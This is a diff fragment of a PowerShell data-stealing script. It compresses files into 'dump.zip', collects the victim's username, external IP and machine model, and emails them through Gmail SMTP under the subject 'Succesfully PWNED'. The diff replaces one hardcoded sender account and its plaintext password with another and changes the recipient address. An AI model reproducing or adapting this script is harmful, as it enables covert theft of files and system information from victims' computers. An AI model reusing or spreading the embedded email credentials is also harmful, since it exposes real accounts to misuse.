@@ -12,11 +12,11 @@ Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("outlook_029241608A6F4CF@outlook.com", "$0xBomber!3197$");
+$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
+$smtp.Credentials = New-Object System.Net.NetworkCredential("sadienavalbej96@gmail.com", "Allison123456@ages");
 $smtp.EnableSsl = $true
-$Message.From = "outlook_029241608A6F4CF@outlook.com"
-$Message.To.Add("htshtuff@gmail.com")
+$Message.From = "sadienavalbej96@gmail.com"
+$Message.To.Add("sadienavalbej96@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
